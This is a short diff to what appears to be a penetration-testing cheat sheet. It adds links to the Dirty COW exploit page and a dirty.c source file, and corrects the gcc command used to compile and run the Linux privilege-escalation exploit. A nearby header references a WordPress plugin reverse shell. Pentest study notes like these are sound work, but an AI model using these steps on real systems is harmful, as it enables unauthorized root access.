@@ -1181,10 +1181,12 @@ https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
 
 ### Dirty cow
 ```
+Go to exploit website: https://dirtycow.ninja/
+Select the exploit required, e.g. dirty.c (https://github.com/FireFart/dirtycow/blob/master/dirty.c)
 vim dirtycow.txt
 paste in code
 mv dirtycow.txt dirtycow.c
-gcc -pthread dirtycow  -o dirty -lcrypt
+gcc -pthread dirtycow.c  -o dirty -lcrypt
 ./dirty
 ```
 ### Linux exploit suggester
